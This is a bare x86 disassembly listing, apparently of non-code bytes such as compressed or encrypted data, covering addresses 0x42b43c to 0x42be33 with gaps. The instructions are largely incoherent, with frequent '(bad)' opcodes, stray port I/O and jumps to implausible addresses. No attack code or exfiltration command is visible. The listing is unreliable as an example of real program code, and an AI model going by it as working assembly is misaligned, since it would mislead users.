  42b43c:	cmp    ebx,eax
  42b43e:	leave  
  42b43f:	xchg   ecx,eax
  42b440:	fst    QWORD PTR [ecx+0x4f]
  42b443:	push   ebp
  42b444:	sbb    ch,BYTE PTR [esi+0x77]
  42b447:	inc    esi
  42b448:	xor    bl,BYTE PTR [eax]
  42b44a:	jmp    0x42b470
  42b44c:	mov    al,ds:0xedbdde1c
  42b451:	pop    ds
  42b452:	mov    bl,0xbd
  42b454:	(bad)  [ebp+0x772fbf5b]
  42b45a:	loopne 0x42b44a
  42b45c:	dec    esp
  42b45d:	(bad)  
  42b45e:	call   0xb26b4778
  42b463:	inc    ecx
  42b464:	fist   WORD PTR [eax+0x299bfce4]
  42b46a:	dec    edx
  42b46b:	fs aas 
  42b46d:	mov    cl,0x0
	...
  42b4d3:	add    BYTE PTR [eax],al
  42b4d5:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b4db:	out    dx,eax
  42b4dc:	into   
  42b4dd:	gs jo  0x42b4b0
  42b4e0:	cld    
  42b4e1:	test   DWORD PTR [edi-0x75],ecx
  42b4e4:	fsubr  st(6),st
  42b4e6:	rol    BYTE PTR [bx+di],1
  42b4e9:	add    BYTE PTR [eax],al
  42b4eb:	add    DWORD PTR [eax],eax
  42b4ed:	add    ah,cl
  42b4ef:	test   eax,0xc24bf1fc
  42b4f4:	sbb    BYTE PTR [edx-0x13],0x13
  42b4f8:	pop    ecx
  42b4f9:	xchg   ecx,ebx
  42b4fb:	stc    
  42b4fc:	sub    al,0xd3
  42b4fe:	(bad)  
  42b4ff:	push   eax
  42b500:	ins    DWORD PTR es:[edi],dx
  42b501:	int    0xd0
  42b503:	shl    dh,cl
  42b505:	push   ebx
  42b506:	cmp    esp,DWORD PTR [ebp+0x50]
  42b509:	retf   
  42b50a:	dec    edi
  42b50b:	sub    edx,esp
  42b50d:	xor    BYTE PTR [edx],ch
  42b50f:	sub    BYTE PTR [edi-0x3483f89b],0xfa
  42b516:	mov    BYTE PTR [ebp+ecx*1+0x30],cl
  42b51a:	out    dx,al
  42b51b:	out    0xa4,al
  42b51d:	in     al,dx
  42b51e:	aad    0xa8
  42b520:	je     0x42b52c
  42b522:	jns    0x42b592
  42b524:	clc    
  42b525:	repz add esi,DWORD PTR [edx]
  42b528:	push   ebx
  42b529:	adc    eax,0x851c0fd5
  42b52e:	cmp    eax,0x21b219de
  42b533:	dec    DWORD PTR [esi]
  42b535:	jge    0x42b598
  42b537:	sub    eax,0x4e91b549
  42b53c:	sbb    dl,BYTE PTR [edx]
  42b53e:	or     DWORD PTR [eax+0x55],0xffffff89
  42b542:	push   ss
  42b543:	push   0x73
  42b545:	sbb    eax,DWORD PTR [ecx+edx*8+0x69396310]
  42b54c:	ror    BYTE PTR [eax+0x75],1
  42b54f:	xlat   BYTE PTR ds:[ebx]
  42b550:	shl    ebp,0x87
  42b553:	jbe    0x42b54d
  42b555:	sub    ebx,0x47462e90
  42b55b:	push   edi
  42b55c:	sbb    al,0x39
  42b55e:	dec    eax
  42b55f:	xchg   ebx,eax
  42b560:	loope  0x42b56c
  42b562:	mov    DWORD PTR ds:0x9fc7a1ce,ebp
  42b568:	mov    bh,0x26
  42b56a:	jns    0x42b55b
  42b56c:	sbb    ebp,0xffffffee
  42b56f:	in     eax,dx
  42b570:	test   al,0x6d
  42b572:	mov    ebx,0x49715546
  42b577:	jb     0x42b51a
  42b579:	ins    BYTE PTR es:[edi],dx
  42b57a:	ret    0xa637
  42b57d:	test   DWORD PTR [ecx-0x5754cafe],esi
  42b583:	xchg   esi,eax
  42b584:	xor    BYTE PTR [edi],ah
  42b586:	jbe    0x42b521
  42b588:	dec    ebx
  42b589:	aas    
  42b58a:	jnp    0x42b5f8
  42b58c:	dec    ebp
  42b58d:	ds pusha 
  42b58f:	xchg   BYTE PTR [edi+ebp*8+0x6e],dh
  42b593:	xchg   DWORD PTR [ebx-0x46021532],edx
  42b599:	inc    ebp
  42b59a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b59b:	jge    0x42b604
  42b59d:	je     0x42b5a8
  42b59f:	xor    BYTE PTR [ecx+eiz*4+0x55],ch
  42b5a3:	repnz shl DWORD PTR [ebx+ebp*2-0x38],cl
  42b5a8:	fucomip st,st(5)
  42b5aa:	fnstcw WORD PTR ds:[eax+0x28]
  42b5ae:	cmp    al,0xfe
  42b5b0:	int3   
  42b5b1:	leave  
  42b5b2:	xchg   ebx,eax
  42b5b3:	mov    al,ds:0xeb7ab77e
  42b5b8:	jmp    0x523313b0
  42b5bd:	add    al,0xfa
  42b5bf:	sbb    eax,0x6ee34ccc
  42b5c4:	je     0x42b590
  42b5c6:	stos   DWORD PTR es:[edi],eax
  42b5c7:	sub    dl,BYTE PTR [eax+0x6c4ed9e8]
  42b5cd:	sub    dl,BYTE PTR [ebx-0x4e]
  42b5d0:	aad    0x91
  42b5d2:	outs   dx,DWORD PTR ds:[esi]
  42b5d3:	popa   
  42b5d4:	popf   
  42b5d5:	setne  dl
  42b5d8:	test   al,0x3c
  42b5da:	daa    
  42b5db:	stos   BYTE PTR es:[edi],al
  42b5dc:	dec    esp
  42b5dd:	jo     0x42b5a8
  42b5df:	and    al,0x57
  42b5e1:	sub    bl,BYTE PTR [eax-0x4d3dfe6c]
  42b5e7:	ja     0x42b633
  42b5e9:	pop    ecx
  42b5ea:	(bad)  
  42b5eb:	mov    ch,0x4f
  42b5ed:	retf   
	...
  42b656:	loopne 0x42b5ec
  42b658:	and    bh,cl
  42b65a:	je     0x42b65b
  42b65c:	out    dx,eax
  42b65d:	mov    edi,0x1397875f
  42b662:	inc    edi
  42b663:	sbb    cl,BYTE PTR [edx+eax*4]
  42b666:	rol    DWORD PTR [bx+di],1
  42b669:	add    BYTE PTR [eax],al
  42b66b:	add    DWORD PTR [eax],eax
  42b66d:	add    BYTE PTR [ebx+0x6757f6d7],bl
  42b673:	cmp    DWORD PTR [edi+0x56],ebp
  42b676:	outs   dx,DWORD PTR ds:[esi]
  42b677:	call   0xb43a:0xf4727694
  42b67e:	scas   al,BYTE PTR es:[edi]
  42b67f:	int3   
  42b680:	pop    es
  42b681:	cld    
  42b682:	das    
  42b683:	xor    edx,DWORD PTR [eax]
  42b685:	in     al,dx
  42b686:	je     0x42b675
  42b688:	push   ebx
  42b689:	inc    esp
  42b68a:	push   esp
  42b68b:	iret   
  42b68c:	fild   WORD PTR [eax-0xa6a0d4d]
  42b692:	mov    ah,bh
  42b694:	imul   esp,ebp,0x3e6b6f9f
  42b69a:	and    al,0xaa
  42b69c:	test   DWORD PTR [esi],esp
  42b69e:	push   ds
  42b69f:	xchg   edi,eax
  42b6a0:	sar    bl,0xc0
  42b6a3:	cld    
  42b6a4:	inc    edx
  42b6a5:	mov    ebx,0x5182d509
  42b6aa:	pop    ss
  42b6ab:	dec    eax
  42b6ac:	out    0x99,al
  42b6ae:	scas   eax,DWORD PTR es:[edi]
  42b6af:	mov    eax,0xd5fb948b
  42b6b4:	and    BYTE PTR [eax],dh
  42b6b6:	sbb    al,0x5a
  42b6b8:	xor    eax,0xa91a376
  42b6bd:	retf   0xa5b1
  42b6c0:	xchg   edi,eax
  42b6c1:	in     eax,dx
  42b6c2:	sub    bh,BYTE PTR ds:0x29670938
  42b6c8:	sub    edx,eax
  42b6ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b6cb:	push   ss
  42b6cc:	sub    dl,BYTE PTR [ebp-0x2c5c8c2b]
  42b6d2:	aam    0xbc
  42b6d4:	test   al,0xfd
  42b6d6:	lock mov edi,0x5150d164
  42b6dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b6dd:	(bad)  
  42b6de:	(bad)  
  42b6df:	stc    
  42b6e0:	and    esp,esp
  42b6e2:	pop    es
  42b6e3:	sub    esp,DWORD PTR [eax]
  42b6e5:	adc    al,0x67
  42b6e7:	(bad)  
  42b6e8:	xchg   esp,eax
  42b6e9:	ret    
  42b6ea:	lea    ebx,[eax-0x1c]
  42b6ed:	mov    ecx,0x5c7c466e
  42b6f2:	push   esp
  42b6f3:	xchg   BYTE PTR [edx],ch
  42b6f5:	imul   DWORD PTR [edx+0x3080bb07]
  42b6fb:	push   0x115602b3
  42b700:	mov    WORD PTR [ebx-0x449f3ed2],gs
  42b706:	xchg   edx,eax
  42b707:	test   al,0x18
  42b709:	call   0x9886261d
  42b70e:	aam    0xdb
  42b710:	test   eax,0x2642ced0
  42b715:	jp     0x42b6dd
  42b717:	cmp    dl,dl
  42b719:	or     al,0x64
  42b71b:	mov    al,ds:0x96706e7b
  42b720:	int3   
  42b721:	mov    esp,0x611eb020
  42b726:	ds in  eax,0xa7
  42b729:	aad    0xe6
  42b72b:	dec    esp
  42b72c:	fidiv  WORD PTR [ebp-0x2f]
  42b72f:	and    ch,BYTE PTR [edx+ebx*8+0x2d6b0b51]
  42b736:	repz and eax,0x9d1068fe
  42b73c:	push   ss
  42b73d:	into   
  42b73e:	cld    
  42b73f:	add    al,0x48
  42b741:	vfmaddsd xmm7,xmm3,QWORD PTR [edi+0x73],xmm7
  42b748:	sub    al,0x48
  42b74a:	push   ebp
  42b74b:	jmp    0x42b707
  42b74d:	jge    0x42b6e4
  42b74f:	sar    DWORD PTR [eax],cl
  42b751:	mov    edi,0x4289541f
  42b756:	fcmovne st,st(1)
  42b758:	outs   dx,DWORD PTR ds:[esi]
  42b759:	ss adc eax,0x3c3e0300
  42b75f:	sub    edi,ecx
  42b761:	jl     0x42b71f
  42b763:	dec    edi
  42b764:	cwde   
  42b765:	hlt    
  42b766:	sub    al,0xc9
  42b768:	add    cl,ah
  42b76a:	push   ecx
  42b76b:	lods   eax,DWORD PTR ds:[esi]
  42b76c:	jne    0x42b720
	...
  42b7d6:	dec    esi
  42b7d7:	inc    edx
  42b7d8:	dec    ecx
  42b7d9:	daa    
  42b7da:	dec    ebp
  42b7db:	das    
  42b7dc:	outs   dx,BYTE PTR ds:[esi]
  42b7dd:	imul   edx,edx,0x63
  42b7e0:	push   ecx
  42b7e1:	xchg   edx,eax
  42b7e2:	fdivr  QWORD PTR [ecx]
  42b7e4:	hlt    
  42b7e5:	int3   
  42b7e6:	rol    BYTE PTR [bx+di],cl
  42b7e9:	add    BYTE PTR [eax],al
  42b7eb:	add    DWORD PTR [eax],eax
  42b7ed:	add    dl,cl
  42b7ef:	loope  0x42b7eb
  42b7f1:	xor    BYTE PTR [eax+0x58],ch
  42b7f4:	mov    bl,0xc0
  42b7f6:	or     eax,DWORD PTR [ecx]
  42b7f8:	xor    DWORD PTR [eax],0x30e71687
  42b7fe:	es xor esp,edi
  42b801:	xchg   edx,eax
  42b802:	push   ebp
  42b803:	shl    DWORD PTR [edi-0x30],1
  42b806:	pop    eax
  42b807:	jge    0x42b7bb
  42b809:	fld    DWORD PTR [esi]
  42b80b:	loopne 0x42b7df
  42b80d:	jnp    0x42b7c7
  42b80f:	pop    ecx
  42b810:	pop    ss
  42b811:	or     ch,bl
  42b813:	ret    0x3dfe
  42b816:	imul   DWORD PTR [edx-0x2ca709d5]
  42b81c:	jbe    0x42b859
  42b81e:	pushf  
  42b81f:	inc    eax
  42b820:	dec    eax
  42b821:	fisubr DWORD PTR [ebx]
  42b823:	mov    bh,BYTE PTR [edi+0x25]
  42b826:	call   DWORD PTR [esi]
  42b828:	mov    BYTE PTR ds:0x4dcbdbb1,cl
  42b82e:	pusha  
  42b82f:	(bad)  
  42b830:	icebp  
  42b831:	add    eax,0x8c842cf4
  42b836:	stos   BYTE PTR es:[edi],al
  42b837:	ret    0x9630
  42b83a:	or     DWORD PTR ds:[esi],esi
  42b83d:	mov    eax,ds:0x3f3b57e2
  42b842:	mov    ah,0x69
  42b844:	outs   dx,BYTE PTR ds:[esi]
  42b845:	mov    DWORD PTR [esi-0x2a8a6610],0xb0eb52fb
  42b84f:	hlt    
  42b850:	(bad)  
  42b852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b853:	or     al,0x49
  42b855:	jne    0x42b7f5
  42b857:	or     ah,BYTE PTR [edx+0x44]
  42b85a:	mov    al,0x86
  42b85c:	add    ebx,ebp
  42b85e:	sar    esp,1
  42b860:	loop   0x42b800
  42b862:	ins    DWORD PTR es:[edi],dx
  42b863:	cmp    eax,eax
  42b865:	mov    esi,0xfb9a9f55
  42b86a:	xchg   edx,eax
  42b86b:	jns    0x42b8bd
  42b86d:	mov    edx,0xa90947ce
  42b872:	mov    dl,BYTE PTR [ebp+0x30]
  42b875:	sub    ch,ch
  42b877:	sub    eax,0xf6239e51
  42b87c:	int3   
  42b87d:	(bad)  
  42b87e:	(bad)  
  42b87f:	sbb    cl,ch
  42b881:	sbb    ecx,DWORD PTR [edi+0x203922]
  42b887:	pop    es
  42b888:	push   edi
  42b889:	lds    edi,FWORD PTR [eax-0x41]
  42b88c:	ins    DWORD PTR es:[edi],dx
  42b88d:	jno    0x42b85a
  42b88f:	sub    ch,cl
  42b891:	fsub   DWORD PTR [edi]
  42b893:	stos   DWORD PTR es:[edi],eax
  42b894:	imul   ecx,ebx,0xffffffb7
  42b897:	mov    eax,ds:0xddb43690
  42b89c:	outs   dx,BYTE PTR ds:[esi]
  42b89d:	(bad)  
  42b89e:	ja     0x42b822
  42b8a0:	mov    esi,0xc0ce38c8
  42b8a5:	cmp    DWORD PTR [eax+0x634dbbc6],eax
  42b8ab:	pop    ds
  42b8ac:	ins    DWORD PTR es:[edi],dx
  42b8ad:	icebp  
  42b8ae:	ins    BYTE PTR es:[edi],dx
  42b8af:	add    eax,0x790bf764
  42b8b4:	push   es
  42b8b5:	(bad)  
  42b8b6:	mov    bh,0x52
  42b8b8:	pop    eax
  42b8b9:	jo     0x42b8a4
  42b8bb:	(bad)  
  42b8bc:	xor    al,0xed
  42b8be:	push   eax
  42b8bf:	mov    ecx,0xdd6e3fff
  42b8c4:	in     eax,0x10
  42b8c6:	into   
  42b8c7:	xlat   BYTE PTR ds:[ebx]
  42b8c8:	(bad)  
  42b8c9:	int    0xa9
  42b8cb:	stc    
  42b8cc:	mov    dl,0xf9
  42b8ce:	fxch   st(2)
  42b8d0:	scas   eax,DWORD PTR es:[edi]
  42b8d1:	adc    eax,0xb24cc94c
  42b8d6:	fmul   st(3),st
  42b8d8:	xchg   ebp,esi
  42b8da:	div    al
  42b8dc:	push   esp
  42b8dd:	inc    ecx
  42b8de:	aas    
  42b8df:	xchg   esi,eax
  42b8e0:	xor    DWORD PTR [esi],eax
  42b8e2:	dec    eax
  42b8e3:	aas    
  42b8e4:	cmp    dh,BYTE PTR [edi]
  42b8e6:	lock loope 0x42b8a4
  42b8e9:	mov    eax,0xe76c8f71
	...
  42b956:	call   0x2a77f8
  42b95b:	out    0xf9,eax
  42b95d:	lahf   
  42b95e:	ret    0x608c
  42b961:	or     ecx,ebx
  42b963:	adc    ecx,DWORD PTR [esi+0x1]
  42b966:	rol    DWORD PTR [bx+di],cl
  42b969:	add    BYTE PTR [eax],al
  42b96b:	add    DWORD PTR [eax],eax
  42b96d:	add    BYTE PTR [edi-0x1c],dh
  42b970:	pop    edi
  42b971:	ret    
  42b972:	pop    esp
  42b973:	xchg   esp,eax
  42b974:	pop    ebp
  42b975:	xor    DWORD PTR [ebp-0x6f],ecx
  42b978:	aam    0x85
  42b97a:	or     ah,BYTE PTR [ebx+0x20]
  42b97d:	pop    esi
  42b97e:	test   BYTE PTR [edi-0x59],ch
  42b981:	mov    esi,0x33815f34
  42b986:	push   edx
  42b987:	mov    ds:0x343ed4d4,al
  42b98c:	mov    ds:0x8c560e6c,al
  42b991:	stc    
  42b992:	sub    dh,bh
  42b994:	ss pop esi
  42b996:	and    BYTE PTR [edi-0x5f62adf8],cl
  42b99c:	dec    esp
  42b99d:	das    
  42b99e:	push   edx
  42b99f:	rcl    BYTE PTR [esi-0x3f],cl
  42b9a2:	cmp    BYTE PTR [eax+0x3c833476],ch
  42b9a8:	out    dx,al
  42b9a9:	jns    0x42b9c1
  42b9ab:	push   ecx
  42b9ac:	inc    ebx
  42b9ad:	sub    al,0xc1
  42b9af:	popa   
  42b9b0:	cmp    DWORD PTR [edx],0xffffffe2
  42b9b3:	nop
  42b9b4:	adc    dl,ch
  42b9b6:	mov    bh,0x6e
  42b9b8:	stos   BYTE PTR es:[edi],al
  42b9b9:	dec    esp
  42b9ba:	xor    eax,DWORD PTR [edi+0x4d38b60a]
  42b9c0:	std    
  42b9c1:	mov    al,ds:0xe8d578dc
  42b9c6:	fsub   QWORD PTR ds:[edi-0x2da5a8c5]
  42b9cd:	js     0x42ba3e
  42b9cf:	and    ebp,ebp
  42b9d1:	mov    esi,0xb31f500b
  42b9d6:	int3   
  42b9d7:	movhlps xmm5,xmm0
  42b9da:	or     BYTE PTR [ebx],ah
  42b9dc:	and    edx,edi
  42b9de:	addr16 pop eax
  42b9e0:	mov    eax,0x12725efb
  42b9e5:	xlat   BYTE PTR fs:[ebx]
  42b9e7:	dec    BYTE PTR [edx]
  42b9e9:	retf   0x5b03
  42b9ec:	fcomp  DWORD PTR [edx-0x66c242f8]
  42b9f2:	jo     0x42ba4d
  42b9f4:	pop    ss
  42b9f5:	mov    edi,0x868418bd
  42b9fa:	xor    DWORD PTR [ebp+0x4d3227a],eax
  42ba00:	xor    al,BYTE PTR [eax]
  42ba02:	adc    cl,ch
  42ba04:	sub    ch,0xeb
  42ba07:	mov    dh,0xc1
  42ba09:	aaa    
  42ba0a:	sub    eax,DWORD PTR [eax+0x638c41b8]
  42ba10:	std    
  42ba11:	push   ecx
  42ba12:	inc    DWORD PTR [ebx-0x69]
  42ba15:	inc    esp
  42ba16:	int    0xfe
  42ba18:	or     DWORD PTR [edx+0x1f90c2b7],0x6db8f769
  42ba22:	in     al,dx
  42ba23:	mov    BYTE PTR ds:0xd0a8b78e,bl
  42ba29:	xchg   ebx,eax
  42ba2a:	pop    ebx
  42ba2b:	jmp    0x3a1250f1
  42ba30:	int3   
  42ba31:	cmc    
  42ba32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ba33:	leave  
  42ba34:	stos   DWORD PTR es:[edi],eax
  42ba35:	or     edx,DWORD PTR [edi-0x3f642af2]
  42ba3b:	cmp    DWORD PTR [edx+0x6896945a],0xffffffbf
  42ba42:	pop    edx
  42ba43:	jnp    0x42ba87
  42ba45:	test   BYTE PTR [edi-0x63],dl
  42ba48:	fdivrp st(7),st
  42ba4a:	push   edi
  42ba4b:	and    dh,BYTE PTR [ebx-0x69a6f614]
  42ba51:	mov    DWORD PTR [eax+0x7b],ebx
  42ba54:	cmp    ebp,DWORD PTR [ecx]
  42ba56:	not    DWORD PTR [ebx]
  42ba58:	aaa    
  42ba59:	jmp    0x38d8478c
  42ba5e:	mov    WORD PTR gs:[eax+0x375dfacd],cs
  42ba65:	and    edx,ecx
  42ba67:	adc    eax,0xd671dfa3
  42ba6c:	(bad)  
  42ba6d:	jns    0x42ba6f
	...
  42bad3:	add    BYTE PTR [eax],al
  42bad5:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42badb:	neg    ebx
  42badd:	outs   dx,DWORD PTR ds:[esi]
  42bade:	push   0x5b
  42bae0:	xchg   ecx,eax
  42bae1:	or     DWORD PTR [edx-0x53],edi
  42bae4:	enter  0x6719,0xd4
  42bae8:	add    DWORD PTR [eax],eax
  42baea:	add    BYTE PTR [ecx],al
  42baec:	add    BYTE PTR [eax],al
  42baee:	or     eax,0x37768a41
  42baf3:	inc    edx
  42baf4:	bound  edx,QWORD PTR [ecx]
  42baf6:	neg    BYTE PTR [ebp+0x1e]
  42baf9:	ins    DWORD PTR es:[edi],dx
  42bafa:	mov    edx,fs
  42bafc:	(bad)  [eax+0x6d]
  42baff:	rcr    ebx,1
  42bb01:	pop    esi
  42bb02:	jmp    0x9da8:0x7d6cdd14
  42bb09:	or     al,0x6e
  42bb0b:	(bad)  
  42bb0c:	jle    0x42ba96
  42bb0e:	pop    eax
  42bb0f:	dec    ebx
  42bb10:	sub    al,0x39
  42bb12:	mov    ebp,0x1bc9e6f
  42bb17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb18:	cli    
  42bb19:	jno    0x42bb71
  42bb1b:	mov    eax,0x7cc254ff
  42bb20:	mov    bh,0x9
  42bb22:	jge    0x42baaf
  42bb24:	or     DWORD PTR cs:[ebp-0x5864d132],edi
  42bb2b:	adc    BYTE PTR [ebx+0x46d5f858],dh
  42bb31:	daa    
  42bb32:	mov    DWORD PTR [edi+ebx*4+0x6d],edi
  42bb36:	inc    esp
  42bb37:	push   edx
  42bb38:	vdivps xmm0,xmm0,XMMWORD PTR [ecx+0x756425a]
  42bb40:	xchg   ecx,eax
  42bb41:	mov    DWORD PTR fs:[edx],ebp
  42bb44:	mov    ebp,0x8ccbf2fb
  42bb49:	sti    
  42bb4a:	mul    DWORD PTR [ebx]
  42bb4c:	or     dl,ah
  42bb4e:	xor    al,0x42
  42bb50:	xor    eax,0x9f98f1e3
  42bb55:	jbe    0x42bb30
  42bb57:	jecxz  0x42bb15
  42bb59:	cmp    al,dh
  42bb5b:	and    bh,BYTE PTR [edx+0x2d4e18ef]
  42bb61:	xchg   ecx,eax
  42bb62:	adc    DWORD PTR [ebp+0x1173f585],ebx
  42bb68:	jle    0x42bb0f
  42bb6a:	fs push ss
  42bb6c:	fild   WORD PTR [ecx]
  42bb6e:	or     bh,BYTE PTR [ebp+0x4e]
  42bb71:	je     0x42bbbd
  42bb73:	xchg   ecx,eax
  42bb74:	stos   BYTE PTR es:[edi],al
  42bb75:	(bad)  
  42bb76:	popa   
  42bb77:	push   ss
  42bb78:	js     0x42bbaf
  42bb7a:	push   ds
  42bb7b:	jnp    0x42bbfc
  42bb7d:	scas   al,BYTE PTR es:[edi]
  42bb7e:	pop    ebx
  42bb7f:	xchg   ebp,ebx
  42bb81:	and    eax,0xe8864cef
  42bb86:	cld    
  42bb87:	inc    esp
  42bb88:	(bad)
  42bb8b:	pop    es
  42bb8c:	mov    al,ds:0x6486bccb
  42bb91:	xchg   ebp,eax
  42bb92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bb93:	cwde   
  42bb94:	push   ds
  42bb95:	bound  ecx,QWORD PTR [ecx+0x2b]
  42bb98:	sahf   
  42bb99:	mov    dh,0x45
  42bb9b:	sbb    ecx,DWORD PTR [esi+0x4a]
  42bb9e:	icebp  
  42bb9f:	fucomi st,st(3)
  42bba1:	xchg   ebp,eax
  42bba2:	cmp    eax,0xb0a90c13
  42bba7:	add    DWORD PTR [ecx+0x5d31265b],edi
  42bbad:	inc    esi
  42bbae:	add    ah,BYTE PTR [ebx+0x5a]
  42bbb1:	adc    eax,DWORD PTR [ebx+0x9]
  42bbb4:	xor    al,0x62
  42bbb6:	inc    ebx
  42bbb7:	and    BYTE PTR [esp+eiz*4],dl
  42bbba:	add    DWORD PTR [ebx+0x74],0xfffffff4
  42bbbe:	pop    esp
  42bbbf:	sar    BYTE PTR [ecx],0x99
  42bbc2:	jmp    0x42bbc6
  42bbc4:	test   al,0x3e
  42bbc6:	jge    0x42bbf8
  42bbc8:	ins    BYTE PTR es:[edi],dx
  42bbc9:	add    eax,0x9a9a15dc
  42bbce:	outs   dx,BYTE PTR ds:[esi]
  42bbcf:	cmp    al,0x50
  42bbd1:	add    eax,0xfcd8981a
  42bbd6:	sub    ebx,DWORD PTR [esi-0x14]
  42bbd9:	mov    ecx,0x14e385e8
  42bbde:	js     0x42bc38
  42bbe0:	addr16 or al,0x23
  42bbe3:	fimul  WORD PTR es:[edx]
  42bbe6:	mov    BYTE PTR ds:0xe76fe1bd,bh
  42bbec:	mov    es,WORD PTR [edx+0x0]
	...
  42bc56:	xor    al,0x28
  42bc58:	add    DWORD PTR [esi],eax
  42bc5a:	sbb    eax,0x233a372f
  42bc5f:	sub    DWORD PTR [ebx],eax
  42bc61:	dec    ecx
  42bc62:	mov    ch,0x4
  42bc64:	xor    bl,ah
  42bc66:	addr16 aad 0x1
  42bc69:	add    BYTE PTR [eax],al
  42bc6b:	add    DWORD PTR [eax],eax
  42bc6d:	add    cl,dh
  42bc6f:	mov    ecx,0x485a106a
  42bc74:	add    esp,DWORD PTR [edi+0x28]
  42bc77:	mov    dh,0xbc
  42bc79:	or     al,0x6
  42bc7b:	(bad)  
  42bc7c:	rcl    DWORD PTR [ebp-0x73],cl
  42bc7f:	retf   
  42bc80:	xchg   ebx,eax
  42bc81:	js     0x42bcf6
  42bc83:	outs   dx,BYTE PTR ds:[esi]
  42bc84:	xchg   BYTE PTR [edi-0x1bc45914],bh
  42bc8a:	mov    al,dh
  42bc8c:	xor    ecx,ecx
  42bc8e:	push   edi
  42bc8f:	and    eax,0x8b806311
  42bc94:	lods   al,BYTE PTR ds:[esi]
  42bc95:	rcr    bl,1
  42bc97:	inc    edi
  42bc98:	jle    0x42bcc6
  42bc9a:	daa    
  42bc9b:	nop
  42bc9c:	inc    edx
  42bc9d:	or     al,0xe3
  42bc9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bca0:	cmc    
  42bca1:	not    DWORD PTR [eax]
  42bca3:	jmp    0x8a73:0x5f5da0ab
  42bcaa:	and    edx,edx
  42bcac:	sub    edi,edx
  42bcae:	gs sub dl,cl
  42bcb1:	in     al,dx
  42bcb2:	mov    ebp,0x5703256e
  42bcb7:	retf   0x8d49
  42bcba:	fs gs jp 0x42bcd1
  42bcbe:	arpl   WORD PTR [ecx],sp
  42bcc0:	call   FWORD PTR [ebp-0x68]
  42bcc3:	mov    cl,0xc9
  42bcc5:	sub    al,0x15
  42bcc7:	push   esp
  42bcc8:	xchg   ebx,eax
  42bcc9:	inc    edx
  42bcca:	pop    ebx
  42bccb:	dec    esp
  42bccc:	fs jp  0x42bcce
  42bccf:	loope  0x42bca4
  42bcd1:	pop    ds
  42bcd2:	(bad)  
  42bcd4:	push   edi
  42bcd5:	push   0xd19ca655
  42bcda:	fcom   QWORD PTR [edi-0x338107e7]
  42bce0:	cs loop 0x42bccf
  42bce3:	dec    ecx
  42bce4:	mov    bh,0xf6
  42bce6:	hlt    
  42bce7:	scas   eax,DWORD PTR es:[edi]
  42bce8:	mov    edx,0x6988b29b
  42bced:	or     BYTE PTR [esi-0x6273a92e],bl
  42bcf3:	imul   ecx,DWORD PTR [ecx+eax*1-0xf],0x180afbb8
  42bcfb:	add    bh,bh
  42bcfd:	stos   DWORD PTR es:[edi],eax
  42bcfe:	ret    
  42bcff:	repz adc eax,0xfcecdb8f
  42bd05:	cmp    al,0xe3
  42bd07:	mov    ds:0xf88e083b,al
  42bd0c:	iret   
  42bd0d:	fwait
  42bd0e:	js     0x42bca7
  42bd10:	into   
  42bd11:	sbb    edx,DWORD PTR [edx+edx*4]
  42bd14:	mov    eax,0xd18507f0
  42bd19:	out    0xa7,al
  42bd1b:	outs   dx,BYTE PTR ds:[esi]
  42bd1c:	inc    esi
  42bd1d:	mov    BYTE PTR [edi-0x663b39f5],dh
  42bd23:	icebp  
  42bd24:	shr    BYTE PTR [esi+0x404fd0d0],1
  42bd2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bd2b:	(bad)  
  42bd2c:	(bad)  
  42bd2d:	jl     0x42bda2
  42bd2f:	or     BYTE PTR [eax],al
  42bd31:	pop    ecx
  42bd32:	rol    DWORD PTR [eax+0x6e],cl
  42bd35:	inc    edi
  42bd36:	das    
  42bd37:	sar    DWORD PTR [ebx+0x77c439d0],1
  42bd3d:	(bad)  
  42bd3e:	jge    0x42bd7c
  42bd40:	and    DWORD PTR [ebx+ecx*4-0x3d],0xd0e4c508
  42bd48:	out    dx,al
  42bd49:	jl     0x42bd4b
  42bd4b:	xchg   ebx,eax
  42bd4c:	add    al,0xba
  42bd4e:	clc    
  42bd4f:	loope  0x42bd12
  42bd51:	neg    DWORD PTR [ecx]
  42bd53:	mov    ecx,eax
  42bd55:	lock imul ecx,DWORD PTR [edx*4+0x4046e469],0xfffffffe
  42bd5e:	out    dx,eax
  42bd5f:	cld    
  42bd60:	jbe    0x42bdd4
  42bd62:	and    BYTE PTR [ecx+0x36],ah
  42bd65:	jmp    0xf5cc3fd2
  42bd6a:	imul   edx,DWORD PTR [edx],0x60
  42bd6d:	push   ebp
	...
  42bdd6:	mov    al,0xb6
  42bdd8:	pushf  
  42bdd9:	adc    al,0x9e
  42bddb:	ds mov eax,0xffec3b6
  42bde1:	jae    0x42bdd7
  42bde3:	out    0x22,eax
  42bde5:	frstor [edi-0x2a]
  42bde8:	add    DWORD PTR [eax],eax
  42bdea:	add    BYTE PTR [ecx],al
  42bdec:	add    BYTE PTR [eax],al
  42bdee:	and    bl,BYTE PTR [eax]
  42bdf0:	cs adc edx,ebp
  42bdf3:	jmp    0x42be12
  42bdf5:	popf   
  42bdf6:	or     BYTE PTR [ecx+0x12c2bb8b],dh
  42bdfc:	jle    0x42bde5
  42bdfe:	mov    bh,0xe4
  42be00:	or     esi,esi
  42be02:	call   0x2833c941
  42be07:	adc    cl,al
  42be09:	fldenv [edx-0x1]
  42be0c:	in     eax,dx
  42be0d:	xchg   BYTE PTR [edi+0x4c0b1e1],bh
  42be13:	retf   0x51e4
  42be16:	ins    BYTE PTR es:[edi],dx
  42be17:	hlt    
  42be18:	pop    esi
  42be1a:	dec    ebp
  42be1b:	xor    BYTE PTR [esi+0x364726ba],ch
  42be21:	lods   al,BYTE PTR ds:[esi]
  42be22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be23:	push   ss
  42be24:	je     0x42be30
  42be26:	adc    DWORD PTR [eax-0x4f24178a],eax
  42be2c:	imul   ebp,DWORD PTR [ebx-0x65],0x69
  42be30:	sahf   
  42be31:	jl     0x42be92
  42be33:	push   edi
